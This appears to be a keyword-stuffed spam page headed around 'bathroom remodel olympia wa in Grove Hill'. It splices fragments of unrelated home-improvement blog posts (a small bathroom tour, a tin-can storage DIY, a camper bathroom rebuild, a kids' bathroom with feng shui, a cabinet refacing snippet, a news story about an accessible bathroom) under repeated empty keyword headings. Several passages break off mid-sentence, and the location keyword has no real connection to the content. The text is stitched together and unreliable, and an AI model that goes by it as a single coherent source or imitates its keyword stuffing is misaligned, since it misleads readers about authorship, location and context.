I wanted to show how I actually live every day in this space. My have really made it possible to keep this space tidy with almost zero effort. Sometimes I get more minimalist and stow the stuff out on the shelves but mostly not. In real life, it doesn&#x2019;t feel cluttered when I&#x2019;m in the space.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p><strong>Paint:</strong> The colors I chose were Tahoe Snow and my standard &#x201c;house white,&#x201d; aka Country Cotton, both Kelly-Moore. Mostly I wanted the room to be fresh and light feeling. It&#x2019;s a water room as well, so icy blue seemed like a perfect almost-neutral. Sometimes it&#x2019;s dressed with pale blue and white towels. Sometimes I get all Scandinavian and use rich red towels.</p>   <p>I went with semi-gloss paint on the icy blue. I like the way it looks and contrasts with the shiny porcelain fixtures. That said, I can&#x2019;t help feeling like a glossier paint would be more durable. Humph. In retrospect, if I had kids, the paint would need to be a durable high gloss. In reality, it&#x2019;s holding up just fine.</p>   <p><strong>Curtain rod &amp; shower curtain:</strong> We raised the shower rod as high as possible and that meant needing an extra long shower curtain. I like a cotton external shower curtain and a vinyl or plastic liner. Well, like on that last part is too strong. I find the liner useful. Buying an extra long liner was pretty simple. They carry them at places like Home Depot but I got a discount version at Ross.</p>   <p>The shower curtain was a bigger problem. I wanted white, something classic looking and long enough to drape prettily on the outside of the tub. But, after investing in the big remodel, I just couldn&#x2019;t stomach dropping $50+ on the extra long shower curtains I found. I didn&#x2019;t really like any of them. I wanted something that would sort of disappear, unless you really looked at it. And then there should be a surprise.</p>   <p>A DIY shower curtain should not be a problem, right? If anything is easy to sew, a straight seam in some cotton should be it. Still,&#xa0; I also was feeling too lazy to actually sew anything.</p>   <p> round up of DIY shower curtains got me started. Measuring, I realized that the size of fabric I needed was basically a flat, full-sized sheet, which would eliminate the sewing requirement. Holes could easily be handled with a grommet kit. And I could make it my own by using fabric ink to stamp some sea monsters along the bottom. More details in .</p>   <p>I love my sea monster border.</p>   <p>&#xa0;</p>   <figure>    <figcaption>     Hopefully you can see here how high the shower rod is. For extra privacy, the curtain can be drawn but nothing actually overlooks the window so the shower curtain is always left open.    </figcaption>   </figure>   <p><strong>New window:&#xa0;</strong> The window was better than I hoped. Sure, it was a conventional, simple shape. Instantly it lit the whole room and cast light into the formerly dark hallway. Even at dusk, the need to turn on a hallway light is eliminated. And ventilation. Who hates that? Finally, it should be said that the window ledge is handy for storage as well. I don&#x2019;t seem to need it in this space but the occasional guest appreciates it.</p>   <figure>    <figcaption>     Even at dusk, there&#x2019;s no need to flip on a light now that there&#x2019;s a window.    </figcaption>   </figure>   <figure>    <figcaption>     The hall also benefits from the new window&#x2019;s light.    </figcaption>   </figure>   <p><strong>Shower surround inserts:</strong> These really add a lot of easy-use storage space.</p>   <figure>    <figcaption>     In one insert, there are body washes. In the other, big pump bottles of shampoo and conditioner. The smaller shelves are perfect for soap and razors.    </figcaption>   </figure>   <p>&#xa0;</p>   <figure>    <figcaption>     Here&#x2019;s a closeup of an insert.    </figcaption>   </figure>   <p><strong>Railway rack:</strong> When I have guests, I put towels on the railway rack for easy access. In everyday life, I don&#x2019;t bother. But I do use the little hooks to dry wet wash cloths, and hand other miscellaneous stuff. So, so handy. And because it&#x2019;s so high, it doesn&#x2019;t cramp anyone&#x2019;s style in the bathroom. See earlier pic.</p>   <p><strong>Over-toilet storage:</strong>&#xa0; I went with three of these glass shelves, which are rated to hold 35lbs each. I store my prettier, everyday use things here. It might look cleaner without the decor items, but I like seeing them. I try to keep a flower in my mom&#x2019;s crystal bud vase. Even flower free, I love looking at it.</p>   <figure>    <figcaption>     When overnight guests come, I store the stuff on the middle shelf in my cabinet to free up a shelf. About 1/3 of the items on the shelf are purely decorative and can easily be put somewhere else if space is needed or I just want to de-clutter.    </figcaption>   </figure>   <figure>    <figcaption>     The top of the toilet is used for clean wash cloths and a little air freshener. Yes, that&#x2019;s my mom&#x2019;s old silver-plated bread basket. I use it more here than at the dining table.    </figcaption>   </figure>   <p><strong>Utility items:</strong> Extra TP, waste basket, plunger, cleaning supplies and more . . . These items all need a place and a plan to keep a bathroom comfortable and functional. Much of it used to be stowed in the awful vanity, which put them in the right room though the vanity was still hard to excavate in the tiny space. Now they each have a specific solution.</p>   <ul>    <li>Three extra toilet paper rolls live in a covered canister. The cats would prefer a more open container but I am ruthless. Go for one that can hold those extra fat rolls.</li>    <li>The trash can is small and has a step-open feature. Extra liners are kept inside the can. Here&#x2019;s something I find ever-baffling: why doesn&#x2019;t everyone use covered waste cans in a bathroom? Who wants to see that waste?</li>    <li>I splurged on a Simple Human magnetic sleeve plunger. This keeps it clean and away from touching anything else. It lives against the wall by the toilet. And actually, the new toilet is so great it&#x2019;s never been used in the almost two years since the remodel.</li>    <li>The hair dryer lives on a hook under the sink. It&#x2019;s easy to plug in, easy to stow.</li>    <li>Cleaning supplies live under another sink, in their own little tub. Once a week I have to walk fifteen extra steps to retrieve the cleaning box.</li>    <li>Wash cloths and extra towels each have a place to live. Wash cloths sit in a silver-plated bread basket on top of the toilet, handy to the sink. Extra towels are placed on the railway rack when company is in town and back in the linen closet when they&#x2019;re not needed.</li>    <li>The railway rack does double duty for drying clothes inside in the winter.</li>    <li>Outside the door storage. I&#x2019;ve often thought of putting a little table in the hall corner, outside the bathroom door. I haven&#x2019;t yet, because the current storage options cover my needs.</li>   </ul>   <figure>    <figcaption>     Extra toilet paper canister, covered waste bin, tucked between sink and toilet.    </figcaption>   </figure>   <figure>    <figcaption>     Simple Human plunger, so far never used.    </figcaption>   </figure>   <figure>    <figcaption>     If the occasional nosy guest really wants to know where my hair dryer is, they have only to look under the sink. Enjoy!    </figcaption>   </figure>   <figure>    <figcaption>     It&#x2019;s a tiny space! Only include the stuff you touch everyday. Cleaning supplies can lurk somewhere else.    </figcaption>   </figure>   <p><strong>Medicine cabinet:</strong> This lovely piece is dedicated to holding tooth supplies. I like these stowed away from the rest of the germs circulating in any bathroom. In almost two years, we&#x2019;ve never had an issue with the toothbrushes not drying out due to being in the cabinet. It&#x2019;s also nice that the cabinet has mirrors outside and in. The one flaw is that the magnetic holder that&#x2019;s supposed to help the cabinet stay closed has come unglued. Since it has no problem staying closed, I haven&#x2019;t bothered to fix it.</p>   <figure>    <figcaption>     Medicine cabinet over the sink. Sink rim is big enough to hold soap and lotion.    </figcaption>   </figure>   <figure>    <figcaption>     Forgive the crazy lighting! I&#x2019;ll try again when it&#x2019;s daylight.    </figcaption>   </figure>   <p><strong>Decor items:</strong> I think a little pretty in a small room somehow grounds it or makes me take it more seriously. And then I mess it up less. Above the towel rack, I put one of my favorite jellyfish illustrations. On another wall, I hung an antique silver mirror found at the Paris flea markets, a comb my grandmother wore, a favorite night light, and an evil eye amulet I brought home from Egypt. It makes me happy to see these things.</p>   <figure>    <figcaption>     A favorite jellyfish over the double towel rack.    </figcaption>   </figure>   <figure>    <figcaption>     Treasures add interest to the little wall alongside the door.    </figcaption>   </figure>   <figure>    <figcaption>     Antique &#x2014; and tarnished &#x2014; silver mirror found at a Paris flea market. I still love it, S!    </figcaption>   </figure>   <figure>    <figcaption>     Antique comb and an evil eye amulet I picked up in Egypt.    </figcaption>   </figure>   <figure>    <figcaption>     Using my good things in the bathroom means I see them more. I love seeing my mom&#x2019;s crystal bud vase everyday.    </figcaption>   </figure>   <p><strong>Lighting:</strong> This didn&#x2019;t go the way I thought it would. Turns out, my ceiling is too low so, in order to have the medicine cabinet open property, the light fixture had to be flipped to point at the ceiling. It&#x2019;s still plenty bright, if a little silly looking. Mostly it&#x2019;s only turned on at night because there&#x2019;s so much light coming in from the window.</p>   <figure>    <figcaption>     Flipped over lights    </figcaption>   </figure>   <p><strong>Most wonderful cabinet in the world</strong>: Now for the cabinet that really makes this space work. As I mentioned, the recipe came from . For mine, there would only be room to put one cabinet in and not the double glass one Family Handyman shows. I wanted mine to have a door that closed but glass wouldn&#x2019;t have that might-be-original-to-the-house look. Esvin from the Pros of Idaho (<span>) </span>made it work perfectly, even adding a little egg knob to match the door knob. This shallow cabinet is great because it allows you to see everything you need without rummaging about. Shelves are adjustable. It&#x2019;s plenty big to store immediately needed supplies, including all that annoying pretty girl stuff. Extras live in a bin in the linen closet and are replenished as needed. I&#x2019;m so enchanted by this guy two years later that even if I weren&#x2019;t remodeling the tiniest bathroom in the world, I&#x2019;d put one in.</p>   <figure>    <figcaption>     Outside of the between-the-studs cabinet from Family Handyman plan.    </figcaption>   </figure>   <figure>    <figcaption>     Between studs cabinet inside. Note that the shelves are adjustable.    </figcaption>   </figure>   <p><em>And now a smug cabinet note:</em> a month after the bathroom was finished, I was browsing a Restoration Hardware catalog. There I saw a between-the-studs long mirrored medicine cabinet! Same size as mine. Beautiful. And $900. Guess they&#x2019;re reading Family Handyman too!</p>   <p><strong>Tile:</strong> As you&#x2019;ll have seen, white tile was the plan. Larger subway tiles were used in the shower and hex tiles on the floor. There&#x2019;s no back splash because when I originally planned the bathroom, the pedestal sink had a built in back splash. And now I&#x2019;m on the fence about whether to add one. What do you think?</p>   <figure>    <figcaption>     Hex floor tiles with gray grout. Subway tile was used instead of baseboard.    </figcaption>   </figure>   <p>Two regrets:</p>   <ul>    <li>I wish it had been easy/feasible/affordable to add another outlet. The space is just so tiny that it didn&#x2019;t seem workable. And the truth is, two outlets has always been just fine. It&#x2019;s not like a bunch of people can stand around in the bathroom together. So this might be simple greed talking.</li>    <li>I dropped almost $100 on the special stopper/plug that goes with the Archer tub. It looked great but within a couple of months, I noticed that it just wasn&#x2019;t stopping up the water. It was one of those twist down jobs that you can&#x2019;t always be sure are working. Instead of getting a full tub of hot water, I got a slow-to-fill tub of lukewarm. Fiddling with it a few times got it working again, but inconsistently. Quite annoying, the opposite of how you want to feel at bath time. And not water wise! Eventually, I just unscrewed it. Now when I want to take a bath, I pull out the rubber stopper I picked up at the dollar store and it works perfectly.</li>   </ul>   <p>And that&#x2019;s about it! What do you think? Ideas for smarter choices? Would you add a back splash behind the sink? If so, made of what?</p>   <p>Thanks for taking the remodeled bathroom tour!</p>  </div>

Since we started our remodel way back in January, to finally be done with the bathroom is definitely a reason to celebrate. Woohoo!</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p> To see where it all began check out  .   <p>We have recently added some shelving above our commode, to give our washroom some added storage.&#xa0; For the shelves, we picked a 1&#x2033; high x 1&#x2032; deep x 6&#x2032; long piece of pine from The Home Depot. While we were there, we had them cut it into 3 equal pieces. Once we were home, I slapped a couple coats of white paint on each board.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>To attach the shelves to the wall I used some brackets leftover from another project.

I also added a picture frame with the words   <em>You Are Beautiful</em> in it. Who doesn&#x2019;t like a good ego bust in the mornings? During this remodel, I had my first adventure in basic electrical work. When I flip the switch, the light comes on, so I called it a success. And I didn&#x2019;t get shocked! Yay! I do not have a picture of the before light, but I assure you, this one is a huge improvement.   <p>The mirror was a great find by my awesome sister, who picked it up for free. I happily traded her an old window I wasn&#x2019;t using for it.</p>   <p>We love our new bathroom! I am impressed that we were able to do it all ourselves.

The floor area&#xa0;under the windows on the northeast side&#xa0;is being filled in with a self-leveling liquid, as it is significantly lower than the rest of the room.&#xa0;Here is Theo exploring the area:</p>   <p>This half of the bathroom&#xa0;was originally a sleeping porch,&#xa0;measuring about 7&#xbd;&#x2019; x 8&#x2032; and accessed by a door (no longer there) on the west wall.&#xa0;When we bought the house in 1981, this room&#xa0;had&#xa0;exterior siding on the two interior walls&#xa0;you see in the photo above. The&#xa0;sloping cement floor and ill-fitting windows&#xa0;rendered the room&#xa0;unusable, one of the reasons&#xa0;we incorporated it into a larger bathroom during the first remodel in&#xa0;1985. (Oh, how I wish I had taken &#x201c;before&#x201d; pictures!)</p>   <p>Now that all of the open spaces in the walls and floor have been covered up, it&#x2019;s safe to let Theo have a good look around:</p>   <p>I hope you&#x2019;ll come back next week for a good look yourself!</p>   <p>&#xa0;</p>   <p>&#xa0;</p>  </div>

Then, I added a few screws to hang the jars and screwed the board to the wall above the sink.</p>   <p>I saw the idea on Pinterest from , but I decided against using the metal brackets. Mostly, because I forgot to buy them on my trip to Home Depot.</p>   <p>So, I improvised and wrapped some twine around them instead. They&#x2019;ll be easier to take down for washing, anyway.</p>   <p>I bought these cute little magnetic baskets at The Dollar Tree several years ago to hang on the refrigerator. For some reason, they never ended up there and have sat in my craft hoard ever since. So, I painted them to match the walls and hung them on the side of the medicine cabinet to store daily use items.</p>   <p>Another idea I snatched from Pinterest. This frame was also a find from my craft supplies. Again, it was wood and I painted it to match the walls, then just glued it behind the towel holder with that I borrowed from the husband&#x2019;s garage.</p>   <p>I put my in another spray painted frame and hung it over the cabinet. <strong>(Get 25% Off this bathroom print with coupon code &#x2013; !)</strong></p>   <p>I also created more storage containers out of some recycled tomato cans. I just removed the labels and lid, cleaned them out and wrapped some twine around the top.</p>   <p>The smaller two cans store my regular use makeup and supplies and the large can holds eucalyptus.</p>   <p>I bought this cabinet at Target a few years ago. It was plain, white and worked great when the bathroom walls were blue. But, with the lighter, silver color I chose this time, it just didn&#x2019;t work. So, I used acrylic paints and spray enamel to make it match the counter top.</p>   <p>My wood texture wall above the shower is by far my greatest achievement in the bathroom!</p>   <p><strong>This is what it looked like before &#x2013;</strong></p>   <p> of what the wood looked like before I painted it.</p>   <p><strong>This is what it looks like now &#x2013;</strong></p>   <p><strong>So much better!</strong></p>   <p>Hanging an extra shower bar at the back of the shower, is another idea I found on . The idea was to hang baskets from it to store shampoos and such, but I just put some S hooks on the rod and hung our scrubbies.</p>   <p>And, last but not least&#x2026;the towel rack.</p>   <p>I &#x201c;borrowed&#x201d; another piece of wood from the husband&#x2019;s garage and screwed it to the wall. Then, I just added a few towel hooks and now, we have the perfect rack to hang towels.</p>   <p>That&#x2019;s the end of my new budget bathroom remodel tour!</p>   <h3>What do you think?</h3>   <h3>Doesn&#x2019;t it look great?!</h3>   <p>&#xa0;</p>   <p><span>Thanks for visiting!</span></p>   <h3><span><strong>Have a Spectacular Day!</strong></span></h3>   <p><span>Vanessa</span></p>   <p><strong>PLEASE NOTE: This post may include affiliate links or links to my shop(s).

I started writing about this over a month ago, but due to my laziness (and a personal situation that I will go into a few months from now) I have not been able to show you the finished results. The bathroom has been done now for about three weeks and we are in love with the results! </p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <div>     This bathroom is on the main floor of the house and it is just a half bath, which made the remodel go much faster. The room was much like the others in this house&#x2013; dated wallpaper and light fixture. However, this bathroom we had one additional problem that the other two didn&#x2019;t have, a leaky toilet.     <p>Not too long after we bought the house I was cleaning the floor and discovered that the floor was sinking in behind the toilet. The toilet must have been leaking for years. It turns out the leak was in the tank. The good, handyman hubby that I have took the toilet apart and replaced the rubber ring between the tank and bowl, which fixed the leak. The floor was really damaged, so the hubby had to tear out the floor down to the joists of the house and replace it. It was quite the process and I can say that I watched in awe as he did his manly handyman project.Next, he tiled the floor and it really turned out looking great! We chose a porcelain tile for this bathroom. Here&#x2019;s a nice pic of the tile:After the floor was tiled, we painted the walls, , replace the light fixture, refinished the wood, reinstalled the trim and chair rail, changed out the handles on the cupboard, and reinstalled the toilet.</p>    <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>    <h2></h2>    <p></p>     <p>Here is the bathroom before: </p>    <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>    <h2></h2>    <p></p>     <p>And here is the bathroom after (sorry the angle of the room makes it tough for a good picture):I am happy to say we have another room down, which means that we have four major rooms to go: living room, upstairs guest room, master bathroom, and the basement bathroom.

   <div>   <p>Today I told my husband that I had been thinking back to that day last May when I had him pull the &#x201c;72&#x201d; Frolic Camper, now known as the , out of the weeds.&#xa0; You remember that day &#x2013; right?&#xa0; It was the day that I seriously questioned my sanity.&#xa0; He admits he clearly remembers.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>I suppose that what I never confessed to anyone was the pang of guilt that washed over me as I looked at this poor neglected camper and thought (for a minute, or thirty plus) about abandoning it.&#xa0; </p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>The thing is, I couldn&#x2019;t stop thinking about this little camper&#x2019;s past.&#xa0; I was certain it had once seen it&#x2019;s share of&#xa0; fun and adventures.&#xa0; I was also certain it provided a lot of good times and lasting memories to it&#x2019;s former owner&#x2019;s.&#xa0; And here I was selling it short, just because it was filthy, rodent infested, and in need of some serious repairs.&#xa0; Guilt is a powerful thing!</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>From that point forward it was full steam ahead, but don&#x2019;t get me wrong, it hasn&#x2019;t been easy.&#xa0; There have definitely been many more hours and dollars spent on the Paradise than what I had originally planned.&#xa0;&#xa0; And there were days that we had to think, and&#xa0; rethink our remodeling options.&#xa0; Now that the inside of the Frolic is nearly finished we are beginning to think ahead to what needs to be done to the outside.&#xa0; I&#x2019;ve ordered new tires for her (I&#x2019;ve decided she is a she) but she still needs new fenders, an awning, and a shiny new paint job.&#xa0; More work, yes.&#xa0; More money, yes.&#xa0; Lingering guilt, no.&#xa0; Still questioning my sanity, umm &#x2013; yes.</p>   <p>The bathroom has proven to be the most time consuming part of the entire project.&#xa0; It needed to be completely torn out out due to rodent and water damage.&#xa0;&#xa0; This meant it needed new studs, insulation, wall and ceiling coverings, a counter and sink base, plumbing (drains, water lines, and faucets) and electric. </p>   <p>I haven&#x2019;t posted much about the bathroom remodel because progress was slow and tedious.&#xa0; Now, that it&#x2019;s finally starting to look like a bathroom I thought I&#x2019;d let you have a peek.</p>   <p>The two pictures above are of the bathroom <strong>BEFORE</strong> we tore everything out.&#xa0; </p>   <p>The wall and ceiling were soft and spongy.&#xa0; After we removed the paper (above) you can see why.</p>   <p>Here is a picture of the bathroom being (carefully) torn apart so we could reuse the original shower insert, toilet, and stainless steel sink.</p>   <p>This is the shower insert and the holding tank that sat under the toilet that we had to remove to work in there.&#xa0; </p>   <p>Above is a picture of the bathroom floor and walls after the tank and shower insert were taken out.</p>   <p>This picture above shows the new insulation we installed.&#xa0; </p>   <p>We installed Luan plywood on the exterior wall.&#xa0; We will be finishing it off with tongue and groove cedar.&#xa0; The cedar was hubby&#x2019;s idea.&#xa0; I was sold on it because It will withstand moisture and it&#xa0; looks nice.</p>   <p>The insulation in the ceiling was installed after each cedar board was secured.</p>   <p>Hubby made a new counter using the old one as a template.&#xa0; I landed a remnant of white Formica at Lowes for dirt cheap.&#xa0; There is white (washable) wall board below the counter and behind the toilet.&#xa0; Here the sink and the holding tank have been reinstalled.</p>   <p>I opted for wainscoting (that I painted pink) on the inside wall of the bathroom. </p>   <p>I applied Danish oil to the cedar to provide a water resistant finish.&#xa0; The light fixture was a reuse from our house and it saved us from having to buy one.</p>   <p>Yes, we have water!</p>   <p>The original toilet has been reinstalled. And yes, it works! Notice the nice and neat plumbing job hubby did?</p>   <p>The old shower floor insert was in need of repair just as you walk into the bathroom. Hubby fixed it with fiberglass and &#x2013; it looks great now. I spray painted the insert with a sand paint by . This covers the old discolored floor and also provides an anti-slip surface. I will put one final coat on the floor once we are completely done installing the cedar, the base cabinet for the sink, the shower faucet, curtain rod, and trim work.</p>   <p>And there you have it, a glimpse at the Pink Paradise&#x2019;s (almost finished) bathroom.&#xa0; </p>   <p>Stay tuned because I will be sharing more updates as we progress.</p>   <div>    <div>     <h3>Share the love!</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

Year in and year out, kitchen remodels continue to show a return on investment (ROI) between 75% and 85%.</p>   <p><b>Freshen Up Your Kitchen</b></p>   <p>If your existing kitchen cabinets are of good quality, are in excellent working condition and the&#xa0;layout functions well, the most affordable option is to freshen them up by refacing.</p>   <p>This involves installing a new veneer on the exterior of the cabinet box and replacing the doors and drawer fronts.</p>   <p>The process is much faster than installing new cabinets because the cabinets remain intact and the work is done onsite. However, be forewarned that when it comes to cabinets, doors and drawer fronts account for the greatest expense.</p>   <p>Sixty to 70 percent of the cost of the cabinet is the door.

   <div>   <p>&#xa0;</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Is there a room in your house that you rarely go into? Possibly avoid at all costs? I do! The kids bathroom! I make my oldest child clean it but I don&#x2019;t even check her work because I don&#x2019;t want to go in there. So gross!!!!</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>So when my oldest moved out, I had to clean it. She had neglected it so badly! I&#x2019;m pretty sure she lied to me several times about cleaning it. I&#x2019;ll spare you the details. Let&#x2019;s just say I had to buy a new toilet. Not the most fun way to spend money. There are so many things I would rather spend money on than a toilet.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>After a big family discussion over cards at game night on whether to get the round toilet seat or the elongated seat; I went with the cheapest one at Home Depot, Glacier Bay for $88. On the box it says that the seat is round but it is actually elongated. Perhaps the elongated one is even more elongated, I don&#x2019;t know. I really didn&#x2019;t care either way, I just wanted the boys to hit the target! You can get it </p>   <p>Of course I cleared it with my dad first because I know he has strong opinions about toilets and he knows a lot about them. He approved the cheap one. Yay!</p>   <p>I had never removed or installed a toilet before so I watched the on the product site. My daughter was shoulder surfing at the time and watched it with me. She is 12. After the video she looked at me and said, &#x201c;I think you and I could tackle this on our own.&#x201d; This surprised and inspired me. So we did it and it was much easier than I thought it would be.</p>   <p>Backing up a bit&#x2026;&#x2026;I figured if I was going to replace the toilet then I should replace the floor first since the toilet sits on top of the floor and we had linoleumin there that I hated. I also had a can of stain that I had bought almost a year prior because of all those Java gel stain Pinterest pins. I also was looking for an excuse to do a .</p>   <p>So one thing led to another for an entire bathroom redo. (Now I love going in that room!)</p>   <p><strong>Feng Shui Frosting </strong></p>   <p>Feng Shui is like icing on a cake to any project. It&#x2019;s an eastern tool to balancing your space. You simply overlay the bagua onto the floor plan of your space and check in with the elements. In this bathroom I have the shower faucet in my abundance corner. Faucets are a source of water. Water can symbolize the flow of water. I also have the drain in that same area. This can symbolize $ going down the drain but together with the faucet it symbolizes the continuous flow of abundance coming in and going out continuously. The fame area is where the window is and my son sings very loudly in the shower with the window open for all to hear. Pretty self explanatory. The toilet and sink are in the health and hygiene area as well as the bathroom rules sticker. The colorful planks on the accent wall is in the simple joy of childhood area. It&#x2019;s the fun wall. Honestly I don&#x2019;t plan my projects around Feng shui, I just go with a flow that feels good.

While the easiest option for a remodel would be to gut simply the room and start from scratch. However, it isn&#x2019;t the most affordable option. You&#x2019;ll want to consider doing a &#x201c;surface&#x201d; remodel in which you only replace or refurbish certain parts of your current bathroom.

   <div>   <p>One day we decided it was high time to do something about our bathroom. It was in okay shape, but it really wasn&#x2019;t our style and there were some funky things about it. We live in a relatively small, one bathroom house. So to have NO storage in the bathroom (we only had a pedestal sink), was sort of a bummer.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>This is what it looked like when we bought the house. We did update the shower curtain to make it look a bit more modern, but that&#x2019;s how it basically stayed for 2 years. Well, no longer.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>First, we did a number on the floor. Out goes the tile. When you start demolition, you discover fun things. Like dry rot. Like a leaky toilet. Like leaks through the floor to the basement. Yup. Fun times. (Oh yeah, you can see our newer curtain in the background. It doesn&#x2019;t stay around for long!)</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Can I remind you that we only have ONE bathroom? Re-doing the floor and installing a new toilet meant a whole day without a toilet. Can I remind you that I&#x2019;m pregnant and have to go all-of-the time? Oh yes, it was a very interesting day. So, to minimize discomfort, they laid the tile just around the toilet, grouted, and installed the toilet before bed on Day 1 of renovation. Whew!</p>   <p>After another day and a half of hard work by Pop (Brian&#x2019;s grandpa), the floor was finished. Wow does it looks amazing. A modern take on a traditional style. Here we&#x2019;ve painted a portion of the wall and started patching up old holes.</p>   <p>And then before you know it, the whole project was over! Beautiful blue paint now adorns those once creamy walls. So peaceful!&#xa0;A simple install of new mirror, artwork, towel racks, new shower curtain, toilet paper holder, baseboards, and vanity pretty much finished the job.</p>   <p>Here is the opposite wall. Rather hotel-like, no?</p>   <p>Close-up of the sink. I even left the water running so you can see how cool the faucet is. I just love it!</p>   <p>And above the toilet we&#x2019;ve got some cute metal artwork. I love the way the blue comes through and shows off the birds. We&#x2019;re still deciding if we&#x2019;ll put in a corner shelf unit to the right of the toilet. We&#x2019;ll see, I guess.</p>   <p>We left the shower the same, it was just white tile. But Pop did re-grout the tile since it&#xa0;was pretty badly done before. He also gave the old pitted tub a nice scrub down so it&#x2019;s whiter than ever. We just love our new bathroom! Totally worth the inconvenience. Thanks Pop for all your hard work (and Brian too, a lot of late nights last week)!</p>  </div>

   <div>   <div>    &#xa0;After moving into my house, I decided to get started on renovating. &#xa0;I quickly decided to and then . &#xa0;All that left was the other upstairs bathroom that needed to be updated. &#xa0;Both of my bathroom upgrades cost about the same amount. &#xa0;See the breakdown of the expenses   </div>   <div>    Of course, I always forget to take the &#x2018;before&#x2019; picture so I&#x2019;ll try to explain how it was. &#xa0;There was a tall oak cabinet with only one door and a Formica top. &#xa0;This left me with no counter space or storage space. &#xa0;The wall was all the tan that is shown on the top of the wall in the picture below.   </div>   <div>    <span><strong>Step 1:</strong></span>    <strong><span> Remove the Existing Vanity</span> </strong>&#x2013; I forgot to take pictures of this step, but I started by unscrewing the counter from the vanity, unscrewing the PVC pipe, and unscrewing the water lines. &#xa0;Then, I lifted the sink and counter directly off the cabinet together. &#xa0;After this, I was able to pull the vanity out.   </div>   <div>    <span><strong>Step 2: Paint the Walls and Trim</strong></span> &#x2013; I decided to go for a two-toned look so I started by painting the lower half of my wall the the trim both Aspen White. &#xa0;When painting a light color over a color that&#x2019;s darker, it&#x2019;s best to prime the wall before painting. &#xa0;I skipped this step and ended up having to paint this part of the wall three times.   </div>   <div>    <span><strong>Step 2: &#x2026;continued</strong></span> &#x2013; Next, I used a gray to paint the top half of the walls. &#xa0;This only took one really heavy coat.   </div>   <div>    <span><strong>Step 3: Hang the Light Fixture</strong></span> &#x2013; &#xa0;Once&#xa0;the wall&#xa0;was dry, I took the opportunity to hang the new light fixture because there wasn&#x2019;t a vanity in the way. &#xa0;I started by removing the old fixture and then installed the new light fixture based on the directions the fixture came with. &#xa0;One problem I ran into was that I needed an electrical box to mount the new fixture on because my old fixture was mounted directly&#xa0;into a stud.   </div>   <div>    <span><strong>Step 4: Hang the Mirror</strong></span> &#x2013; I then hung the mirror level with the medicine cabinet. &#xa0;Hanging the mirror was the same as hanging any heavy picture.   </div>   <div>    <span><strong>Step 5: Add the Backsplash</strong></span> &#x2013; This was my favorite part of both bathrooms. &#xa0;I had my back-splash pre-cut and was able to lay out my pieces in order on the ground and simply add the adhesive to the wall and then press them in firmly. &#xa0;Once the adhesive dried, I mixed the grout and applied to the tiles. &#xa0;After the grout dried, I just rinsed the tiles off with a sponge and water and the grout was complete. &#xa0;After a month, I went back and added sealant to the grout.   </div>   <div>    <span><strong>Step 7: Adding a Chair Rail</strong></span> &#x2013; I had painted my chair rail in the garage at the same time that I painted the white portions of the bathroom. &#xa0;I also decided before painting the walls that the chair rail would be at the same level as the door knob. &#xa0;I hung the chair rail by nailing it to the wall.   </div>   <div>    <span><strong>Step 8:&#xa0;</strong></span>    <strong><span>Caulking</span></strong> &#x2013; Once the chair rail was hung, I caulked around the sink at the base of the back-splash, and at the top of the chair rail and back-splash.   </div>   <div>    <span><strong>Step 9: Flooring</strong></span> &#x2013; I chose not to do the flooring on my own because of the added expenses of the equipment I would need. &#xa0;So, once my bathrooms and kitchen were finished, I selected the flooring I wanted and scheduled installers.   </div>   <div>    <span><strong>Step 10: Decorating</strong></span> &#x2013; I then chose a theme for the bathroom and decorated away.   </div>   <div>    <div>     Spread the love    </div>    <ul>     <li>      <ss>       &#xa0;      </ss></li>     <li>      <ss>       &#xa0;      </ss></li>     <li>      <ss>       &#xa0;      </ss></li>     <li>      <ss>       &#xa0;      </ss></li>     <li>      <ss>       &#xa0;      </ss></li>     <li>      <ss>       &#xa0;      </ss></li>     <li>      <ss>       &#xa0;      </ss></li>     <li>      <ss>       &#xa0;      </ss></li>    </ul>   </div>  </div>

Now those bathrooms are finished and FOX 4 Problem Solver Linda Wagar has the big reveal and the even bigger reaction from two very happy families.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Candita Crawford knew she was getting a new bathroom designed for her 13-year-old son Kelvon, but wasn&#x2019;t expecting what she saw.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&quot;(Screaming!!!) That is way cool!&quot; Crawford exclaimed.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>It's the bathroom she'd always dreamed of her son, but never thought she'd see. The impossible dream came true when she won for families with children with disabilities.</p>   <p>When Jake Schloegel first learned about 13-year-old Kelvon, Candita's bathroom was just a shell where a contractor had torn it out, but then disappeared.</p>   <p>&quot;They tore it out and left, so we thought it would be a good opportunity to come in and get it put back together for her,&quot; Schloegel said.</p>   <p>A bathroom suited especially for Kelvon. Schloegel widened the door so his wheelchair could make it through. He also made the shower 10-feet long so both Kelvon and his helper will have plenty of room to maneuver.</p>   <p>&quot;This is your new bathroom. This is where it all goes down,&quot; Crawford explained to Kelvon.</p>   <p>Even the shower head is 